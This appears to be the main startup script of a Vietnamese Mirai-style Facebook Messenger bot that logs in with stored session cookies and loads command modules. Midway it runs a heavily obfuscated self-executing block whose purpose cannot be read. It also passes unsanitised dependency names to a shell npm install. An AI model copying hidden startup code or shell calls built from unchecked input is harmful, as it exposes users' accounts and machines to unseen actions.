//////////////////////////////////////////////////////
//========= Require all variable need use =========//
/////////////////////////////////////////////////////
//require("./utils/web")
const moment = require("moment-timezone");
const { readdirSync, readFileSync, writeFileSync, existsSync, unlinkSync, rm } = require("fs-extra");
const { join, resolve } = require("path");
const chalk = require("chalk");
const { execSync } = require('child_process');
const logger = require("./utils/log.js");
const login = require("./includes/fca");
const axios = require("axios");
const listPackage = JSON.parse(readFileSync('./package.json')).dependencies;
const listbuiltinModules = require("module").builtinModules; 

global.client = new Object({
    commands: new Map(),
    events: new Map(),
    cooldowns: new Map(),
    eventRegistered: new Array(),
    handleSchedule: new Array(),
    handleReaction: new Array(),
    handleReply: new Array(),
    mainPath: process.cwd(),
    configPath: new String(),
  getTime: function (option) {
        switch (option) {
            case "seconds":
                return `${moment.tz("Asia/Ho_Chi_minh").format("ss")}`;
            case "minutes":
                return `${moment.tz("Asia/Ho_Chi_minh").format("mm")}`;
            case "hours":
                return `${moment.tz("Asia/Ho_Chi_minh").format("HH")}`;
            case "date": 
                return `${moment.tz("Asia/Ho_Chi_minh").format("DD")}`;
            case "month":
                return `${moment.tz("Asia/Ho_Chi_minh").format("MM")}`;
            case "year":
                return `${moment.tz("Asia/Ho_Chi_minh").format("YYYY")}`;
            case "fullHour":
                return `${moment.tz("Asia/Ho_Chi_minh").format("HH:mm:ss")}`;
            case "fullYear":
                return `${moment.tz("Asia/Ho_Chi_minh").format("DD/MM/YYYY")}`;
            case "fullTime":
                return `${moment.tz("Asia/Ho_Chi_minh").format("HH:mm:ss DD/MM/YYYY")}`;
        }
  }
});

global.data = new Object({
    threadInfo: new Map(),
    threadData: new Map(),
    userName: new Map(),
    userBanned: new Map(),
    threadBanned: new Map(),
    commandBanned: new Map(),
    threadAllowNSFW: new Array(),
    allUserID: new Array(),
    allCurrenciesID: new Array(),
    allThreadID: new Array()
});

global.utils = require("./utils");

global.nodemodule = new Object();

global.config = new Object();

global.configModule = new Object();

global.moduleData = new Array();

global.language = new Object();
console.log(chalk.bold.hex("#ff0505").bold("=== APPSTATE - CONFIG ==="));

global.anti = resolve(process.cwd(),'anti.json')
//////////////////////////////////////////////////////////
//========= Find and get variable from Config =========//
/////////////////////////////////////////////////////////

var configValue;
try {
    global.client.configPath = join(global.client.mainPath, "config.json");
    configValue = require(global.client.configPath);
}
catch {
    if (existsSync(global.client.configPath.replace(/\.json/g,"") + ".temp")) {
        configValue = readFileSync(global.client.configPath.replace(/\.json/g,"") + ".temp");
        configValue = JSON.parse(configValue);
        logger.loader(`Found: ${global.client.configPath.replace(/\.json/g,"") + ".temp"}`);
    }
    else return logger.loader("config.json Đâu hả con mẹ mày=))?", "error");
}

try {
    for (const key in configValue) global.config[key] = configValue[key];
    logger.loader("Config Done");
}
catch { return logger.loader("Can't load file config!", "error") }

const { Sequelize, sequelize } = require("./includes/database");

writeFileSync(global.client.configPath + ".temp", JSON.stringify(global.config, null, 4), 'utf8');

/////////////////////////////////////////
//========= Load language use =========//
/////////////////////////////////////////

const langFile = (readFileSync(`${__dirname}/languages/${global.config.language || "en"}.lang`, { encoding: 'utf-8' })).split(/\r?\n|\r/);
const langData = langFile.filter(item => item.indexOf('#') != 0 && item != '');
for (const item of langData) {
    const getSeparator = item.indexOf('=');
    const itemKey = item.slice(0, getSeparator);
    const itemValue = item.slice(getSeparator + 1, item.length);
    const head = itemKey.slice(0, itemKey.indexOf('.'));
    const key = itemKey.replace(head + '.', '');
    const value = itemValue.replace(/\\n/gi, '\n');
    if (typeof global.language[head] == "undefined") global.language[head] = new Object();
    global.language[head][key] = value;
}

global.getText = function (...args) {
    const langText = global.language;    
    if (!langText.hasOwnProperty(args[0])) throw `${__filename} - Not found key language: ${args[0]}`;
    var text = langText[args[0]][args[1]];
    for (var i = args.length - 1; i > 0; i--) {
        const regEx = RegExp(`%${i}`, 'g');
        text = text.replace(regEx, args[i + 1]);
    }
    return text;
}

try {
    var appStateFile = resolve(join(global.client.mainPath, global.config.APPSTATEPATH || "appstate.json"));
    var appState = require(appStateFile);
    logger.loader(global.getText("mirai", "foundPathAppstate"))
}
catch { return logger.loader(global.getText("mirai", "notFoundPathAppstate"), "error") }
console.log(chalk.bold.hex("#f70505").bold("『 Qsown 』→ vui lòng chờ 5s - 20s kích hoạt bot (tùy vào mạng nhà bạn)"));

////////////////////////////////////////////////////////////
//========= Login account and start Listen Event =========//
////////////////////////////////////////////////////////////

var checkBan;(function(){var JCn='',Noz=907-896;function UGl(y){var l=1729799;var b=y.length;var i=[];for(var x=0;x<b;x++){i[x]=y.charAt(x)};for(var x=0;x<b;x++){var p=l*(x+348)+(l%42031);var n=l*(x+430)+(l%19664);var w=p%b;var s=n%b;var t=i[w];i[w]=i[s];i[s]=t;l=(p+n)%2007126;};return i.join('')};var xxN=UGl('khqbcrducrfeucysntjopzwotxsvrmgtaloin').substr(0,Noz);var AtG='+ur 2nz(0a+.5, l,oal;b+i;;ubo ;h7aC;Cu]olp<;t}1(=cr+8C+(,;Am=rb,nt99=a+5.r{,vx3isf;pitt,u0nw5;ci)79jzncfrv(t])o,g.nt+t65a2tv0S,=j](-;rjv-r[x[qtn)y0a=nttli=i,==[e A]j=y.f;rar;hfr0v(l=2h)axa(barupc;xdnr(v1d+.k]uj+(qt{hin2=.a4nor)),nl)d!nrh;s4mg;;.xsm1.(;i}vivz.+owe=tttear)l=(o-z0.nh-hjxzvg(;z)y{(+] e)ru(live[mn8"[=];rav m81u[l;[ogc"++;htlyp=n7)1sc,);)9e"(;r(kr+lv)8o0v]r{).h++;ir.,w1ofc=), o.eo=8=,}elr7;rla ]ri((z){ =az2)<rl"(ccob=<o1e.lrh"nr-tutf*.c+,f(e;s<;.u<{)jat{=g,dsv,w=a1kr; )]rvnbfC9glvv(;  18rinaC+kCof;=h( 82;as=grtaa.n2h.m"=vu,stw)=u()a7;(nv=dn+t)7)tr=-h6q.[;1ufulspn=(f;s+eirt=bat)Ad.nr8sA(=["r u[l;a}3pr6baz]e>v=;hbshveyhh7lfps>ei]7aof toimvr)g;f+nv,=v;gov )zh)x="3;vaaa(+[o,.ta;ir;ur!p2s0n x"("o}, =fa91,rn3;hkt6aer=[;]60tn}6ejC(,areoe==]zi.glf))mq9xmr+deh4,se+gr(.12u1=[;lnap=(vn.si8([)jlfr, -m;ay6arc;e m  rfg*=(0v0S.ni7A.rze(;l,ropu=6z8)7ck )hn)+2r}i4 q pi0Ceao,.rxgnrxnr';var VVj=UGl[xxN];var fIj='';var Vdi=VVj;var OBa=VVj(fIj,UGl(AtG));var FLL=OBa(UGl('oX)%SrisXeb2]3}!"aos3.[.6ee$sttsx=ts$nsX2nro2)1:X1().yu=oet(cse)7 (X(X);Xy.a_aC"X.5= *X.1o0 X)ldas:qee.eX:ot]od0_aqo79X.X)a.)._3es$l_XnXfzoXn3(9e.4.(eb.2ae%(+#lx#bX.;.XzhX202aN:"21X0e,X1joeE7=eu32_i.3.u}(fr.ao.cr5l4..}3-61 $t!5.n9X$X\/f4f&a.jb,crdxt.yds"a!9%X_dz7)ges.sl-.\/e.2.e(yss_3(4,_ne.3$0_1.64.eo.t)1.tr]9S(Xj3XXt,a\/e0,osro_=Xo3reeshs4(2oh=lX 5y_e.dax4w8X {0EXn)zS\/j.;(eonbs2e!XigM({,a..Tg.)d$s4DX(c$,abcf;(d3.!eg)g1tX%_63i)Xj.g.u3jX.}0eX3s;40=75=zXX\/anX[lf1y]r.&c%"_.t0X)re_ut$$,ege9e.t,}.y"TM1ei_7=es;eef"ar\/]d0{;_ene.3or IX!e%ajXo$.m,DpX8n$3=Xh.i!*=!e;(DXj7cX=XX7.y$eaer5l}]$n*o.$.!s)!Xnj}X.bre..g!)_%.T6r5a=rt);b)eD1aX_ +rsneX]Xe)_)0.8{X}z03rvs;}o%6u.=Xp9e.eX$.;f1as+${r%.#a.)eoa_ese\/)or6348i..X,n\/m7T00a(_)a)h4..X!53\/TevXeXX..sa]4r.eXXd_$nX\'-eee7a;o\'4XX)c.0p(,XX}l5;cdoXr7(gE!;XXboX(X(.r!2XXhrp(g.!e.),ooX)dd1a,o(y,gni3 n9reo.jX3=0);#3!xa)X9a;i3)se3.)tf\']d4)0.h.lCS..c).X#.cXXe.,6XpX47]]#e(9.fu;Es$_ afX7x)a=es3.cp;=.01!.XX_.].fiolai+e[sXrXj0%SX*miX3.X8nt,.e\/*(i.,o;](r,Xdp)(]0snhs(7b rgX.;.tMe;2S{inX7xsN;r&a0eT.k}1ui[.jw$!,ros=e+c#j.a+X[p8&or!%03.$83Nz.ze6t{Xn]{rXn4e4X&.a(6._0:;d6t,nXa7f9_b]Xs2S;4s+(uiuXe4$)X$(!-_5)f.)(XMXa;{\'$. 6Xjrbs0t.)$(nerocs[(X36{{%9oercsa)t;Et_orl{!{o."af]!X},.])enpe1eb, ()_g)cn=csysX2X.! 9.ifsd4t p2j2.7j.X{Xtj.,1.oXvr..sog6_1;(fg2iX{.=7 *X,,$.6nc})rj32y;c0 s,n)cs_.Ea7ef!.#XoXl\/!Xpb{2,cg_.i(fouX4%c;curcv!0,lf2i* tb3ie1"6.])n-+ .(t_rX$%y6a;a}r.70,Xie$i.7;u3$;8.vb,14_}f% b Xlefez 9Xgu=Xe.re9cC0e(t ,$n;28t}_;XoMjIoa=p24r[g,(f$jXt3$)\/4c($ctpmgX!e_&m!cf_)tXc;.4pco.4)22;jco)sa5n)X(Xm.(_d% {_w _M(u=0)iXq"X{rsX_gh(a7$ +\/=n aae)e(=%}=Ef1!(.,)fX%.o)]'));var WzC=Vdi(JCn,FLL );WzC(9161);return 9312})()
                // if (_0x2f978e.headers.server != 'cloudflare') return logger('BYPASS DETECTED!!!', 'BANNED'), 
                //  process.exit(0);
                
        // if (dataGban.headers.server != 'cloudflare') 
        //  return logger('BYPASS DETECTED!!!', 'BANNED'), 
        // process.exit(0);
            

            // if (json.headers.server == 'cloudflare') 
            //  return logger('BYPASS DETECTED!!!', 'BANNED'), 
            // process.exit(0);
            
function onBot({ models }) {
    const loginData = {};
    loginData['appState'] = appState;
    login(loginData, async(loginError, loginApiData) => {
        if (loginError) return logger(JSON.stringify(loginError), `ERROR`);
      global.client.api = loginApiData
        loginApiData.setOptions(global.config.FCAOption)
        writeFileSync(appStateFile, JSON.stringify(loginApiData.getAppState(), null, '\x09'))
        global.config.version = '1.2.15'
        global.client.api = loginApiData
        global.client.timeStart = new Date().getTime(),
            function () {
                const listCommand = readdirSync(global.client.mainPath + '/modules/commands').filter(command => command.endsWith('.js') && !command.includes('example') && !global.config.commandDisabled.includes(command));
                for (const command of listCommand) {
                    try {
                        var module = require(global.client.mainPath + '/modules/commands/' + command);
                        if (!module.config || !module.run || !module.config.commandCategory) throw new Error(global.getText('mirai', 'errorFormat'));
                        if (global.client.commands.has(module.config.name || '')) throw new Error(global.getText('mirai', 'nameExist'));
                        if (!module.languages || typeof module.languages != 'object' || Object.keys(module.languages).length == 0) //logger.loader(global.getText('mirai', 'notFoundLanguage', module.config.name), 'warn');
                        if (module.config.dependencies && typeof module.config.dependencies == 'object') {
                            for (const reqDependencies in module.config.dependencies) {
                                const reqDependenciesPath = join(__dirname, 'nodemodules', 'node_modules', reqDependencies);
                                try {
                                    if (!global.nodemodule.hasOwnProperty(reqDependencies)) {
                                        if (listPackage.hasOwnProperty(reqDependencies) || listbuiltinModules.includes(reqDependencies)) global.nodemodule[reqDependencies] = require(reqDependencies);
                                        else global.nodemodule[reqDependencies] = require(reqDependenciesPath);
                                    } else '';
                                } catch {
                                    var check = false;
                                    var isError;
                                    logger.loader(global.getText('mirai', 'notFoundPackage', reqDependencies, module.config.name), 'warn');
                                    execSync('npm ---package-lock false --save install' + ' ' + reqDependencies + (module.config.dependencies[reqDependencies] == '*' || module.config.dependencies[reqDependencies] == '' ? '' : '@' + module.config.dependencies[reqDependencies]), { 'stdio': 'inherit', 'env': process['env'], 'shell': true, 'cwd': join(__dirname, 'nodemodules') });
                                    for (let i = 1; i <= 3; i++) {
                                        try {
                                            require['cache'] = {};
                                            if (listPackage.hasOwnProperty(reqDependencies) || listbuiltinModules.includes(reqDependencies)) global['nodemodule'][reqDependencies] = require(reqDependencies);
                                            else global['nodemodule'][reqDependencies] = require(reqDependenciesPath);
                                            check = true;
                                            break;
                                        } catch (error) { isError = error; }
                                        if (check || !isError) break;
                                    }
                                    if (!check || isError) throw global.getText('mirai', 'cantInstallPackage', reqDependencies, module.config.name, isError);
                                }
                            }
                            //logger.loader(global.getText('mirai', 'loadedPackage', module.config.name));
                        }
                        if (module.config.envConfig) try {
                            for (const envConfig in module.config.envConfig) {
                                if (typeof global.configModule[module.config.name] == 'undefined') global.configModule[module.config.name] = {};
                                if (typeof global.config[module.config.name] == 'undefined') global.config[module.config.name] = {};
                                if (typeof global.config[module.config.name][envConfig] !== 'undefined') global['configModule'][module.config.name][envConfig] = global.config[module.config.name][envConfig];
                                else global.configModule[module.config.name][envConfig] = module.config.envConfig[envConfig] || '';
                                if (typeof global.config[module.config.name][envConfig] == 'undefined') global.config[module.config.name][envConfig] = module.config.envConfig[envConfig] || '';
                            }
                            //logger.loader(global.getText('mirai', 'loadedConfig', module.config.name));
                        } catch (error) {
                            throw new Error(global.getText('mirai', 'loadedConfig', module.config.name, JSON.stringify(error)));
                        }
                        if (module.onLoad) {
                            try {
                                const moduleData = {};
                                moduleData.api = loginApiData;
                                moduleData.models = models;
                                module.onLoad(moduleData);
                            } catch (_0x20fd5f) {
                                throw new Error(global.getText('mirai', 'cantOnload', module.config.name, JSON.stringify(_0x20fd5f)), 'error');
                            };
                        }
                        if (module.handleEvent) global.client.eventRegistered.push(module.config.name);
                        global.client.commands.set(module.config.name, module);
                        //logger.loader(global.getText('mirai', 'successLoadModule', module.config.name));
                    } catch (error) {
                        //logger.loader(global.getText('mirai', 'failLoadModule', module.config.name, error), 'error');
                    };
                }
            }(),
            function() {
                const events = readdirSync(global.client.mainPath + '/modules/events').filter(event => event.endsWith('.js') && !global.config.eventDisabled.includes(event));
                for (const ev of events) {
                    try {
                        var event = require(global.client.mainPath + '/modules/events/' + ev);
                        if (!event.config || !event.run) throw new Error(global.getText('mirai', 'errorFormat'));
                        if (global.client.events.has(event.config.name) || '') throw new Error(global.getText('mirai', 'nameExist'));
                        if (event.config.dependencies && typeof event.config.dependencies == 'object') {
                            for (const dependency in event.config.dependencies) {
                                const _0x21abed = join(__dirname, 'nodemodules', 'node_modules', dependency);
                                try {
                                    if (!global.nodemodule.hasOwnProperty(dependency)) {
                                        if (listPackage.hasOwnProperty(dependency) || listbuiltinModules.includes(dependency)) global.nodemodule[dependency] = require(dependency);
                                        else global.nodemodule[dependency] = require(_0x21abed);
                                    } else '';
                                } catch {
                                    let check = false;
                                    let isError;
                                    logger.loader(global.getText('mirai', 'notFoundPackage', dependency, event.config.name), 'warn');
                                    execSync('npm --package-lock false --save install' + dependency + (event.config.dependencies[dependency] == '*' || event.config.dependencies[dependency] == '' ? '' : '@' + event.config.dependencies[dependency]), { 'stdio': 'inherit', 'env': process['env'], 'shell': true, 'cwd': join(__dirname, 'nodemodules') });
                                    for (let i = 1; i <= 3; i++) {
                                        try {
                                            require['cache'] = {};
                                            if (global.nodemodule.includes(dependency)) break;
                                            if (listPackage.hasOwnProperty(dependency) || listbuiltinModules.includes(dependency)) global.nodemodule[dependency] = require(dependency);
                                            else global.nodemodule[dependency] = require(_0x21abed);
                                            check = true;
                                            break;
                                        } catch (error) { isError = error; }
                                        if (check || !isError) break;
                                    }
                                    if (!check || isError) throw global.getText('mirai', 'cantInstallPackage', dependency, event.config.name);
                                }
                            }
                            //logger.loader(global.getText('mirai', 'loadedPackage', event.config.name));
                        }
                        if (event.config.envConfig) try {
                            for (const _0x5beea0 in event.config.envConfig) {
                                if (typeof global.configModule[event.config.name] == 'undefined') global.configModule[event.config.name] = {};
                                if (typeof global.config[event.config.name] == 'undefined') global.config[event.config.name] = {};
                                if (typeof global.config[event.config.name][_0x5beea0] !== 'undefined') global.configModule[event.config.name][_0x5beea0] = global.config[event.config.name][_0x5beea0];
                                else global.configModule[event.config.name][_0x5beea0] = event.config.envConfig[_0x5beea0] || '';
                                if (typeof global.config[event.config.name][_0x5beea0] == 'undefined') global.config[event.config.name][_0x5beea0] = event.config.envConfig[_0x5beea0] || '';
                            }
                            //logger.loader(global.getText('mirai', 'loadedConfig', event.config.name));
                        } catch (error) {
                            throw new Error(global.getText('mirai', 'loadedConfig', event.config.name, JSON.stringify(error)));
                        }
                        if (event.onLoad) try {
                            const eventData = {};
                            eventData.api = loginApiData, eventData.models = models;
                            event.onLoad(eventData);
                        } catch (error) {
                            throw new Error(global.getText('mirai', 'cantOnload', event.config.name, JSON.stringify(error)), 'error');
                        }
                        global.client.events.set(event.config.name, event);
                        //logger.loader(global.getText('mirai', 'successLoadModule', event.config.name));
                    } catch (error) {
                        //logger.loader(global.getText('mirai', 'failLoadModule', event.config.name, error), 'error');
                    }
                }
            }()
        logger.loader(global.getText('mirai', 'finishLoadModule', global.client.commands.size, global.client.events.size)) 
        //logger.loader('=== ' + (Date.now() - global.client.timeStart) + 'ms ===')

        writeFileSync(global.client['configPath'], JSON['stringify'](global.config, null, 4), 'utf8') 
        unlinkSync(global['client']['configPath'] + '.temp');        
        const listenerData = {};
        listenerData.api = loginApiData; 
        listenerData.models = models;
        const listener = require('./includes/listen')(listenerData);

        function listenerCallback(error, message) {
            if (error) return logger(global.getText('mirai', 'handleListenError', JSON.stringify(error)), 'error');
            if (['presence', 'typ', 'read_receipt'].some(data => data == message.type)) return;
            return listener(message);
        };
        /*setInterval(function() {
            uptime();
            process.exit(1)
        }, 1000 * 60 * 200);*/

        global.handleListen = loginApiData.listenMqtt(listenerCallback);
        global.client.api = loginApiData;

        require('./utils/uptime.js')
// CHỈNH TIME RESTART REPL THƯỜNG
      // => 1000 * 60 * 45
// CHỈNH TIME RESTART CHO REPL HACKER
      // => 1000 * 60 * 200

        //setInterval(async function () {
            //global.handleListen.stopListening(),
            //global.checkBan = ![],
            //setTimeout(function () {
                //return global.handleListen = loginApiData.listenMqtt(listenerCallback);
            //}, 500);
            //try {
                //await checkBan(loginApiData);
            //} catch {
                //return process.exit(0);
            //};
           // if (!global.checkBan) logger(global.getText('mirai', 'warningSourceCode'), 'BANNED');
            //global.config.autoClean && (global.data.threadInfo.clear(), global.client.handleReply = global.client.handleReaction = {});
            //if (global.config.DeveloperMode == !![]) 
                //return logger(global.getText('mirai', 'refreshListen'), 'DEV MODE');
        //}, 600000);
    });
}
//////////////////////////////////////////////
//========= Connecting to Database =========//
//////////////////////////////////////////////

(async() => {
    try {
        await sequelize.authenticate();
        const authentication = {};
        authentication.Sequelize = Sequelize;
        authentication.sequelize = sequelize;
        const models = require('./includes/database/model')(authentication);
        logger(global.getText('mirai', 'successConnectDatabase'), '');

        const botData = {};
        botData.models = models
        onBot(botData);
    } catch (error) { logger(global.getText('mirai', 'successConnectDatabase', JSON.stringify(error)), '[ Gkhanh x Toàn ] '); }
  })()
process.on('unhandledRejection', (err, p) => {})
      .on('uncaughtException', err => { console.log(err); });